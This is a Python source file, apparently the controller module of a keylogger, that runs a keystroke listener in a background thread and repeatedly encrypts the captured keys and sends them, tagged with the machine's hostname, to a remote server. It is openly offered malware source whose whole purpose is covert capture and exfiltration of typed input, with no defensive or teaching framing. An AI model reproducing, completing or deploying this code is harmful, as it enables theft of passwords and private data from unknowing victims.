import threading
from time import sleep
from service.listener import Listener
from service.data_collector import Package
from networkwriter import NetworkWriter
import socket
hostname = socket.gethostname()

class Manager:
    def __init__(self, hours=5):
        self.listener = Listener()
        self.service = threading.Thread(target=self.listener.run)
        self.hours = hours
        self.run = False


    def start(self):
        self.service.start()
        self.run = True

        print('KeyLogger service is running!')
        while self.run:
            sleep(self.hours)
            temp_data = self.listener.get_keys()
            if temp_data:
                data = Package(temp_data)
                data = data.encrypt()
                nw = NetworkWriter()
                nw.send_data({"machine": hostname,"data": data})
                print('Sent successfully to server!')
    def stop(self):
        self.listener.stop()
        self.run = False
if __name__ == '__main__':
    p = Manager()
    p.start()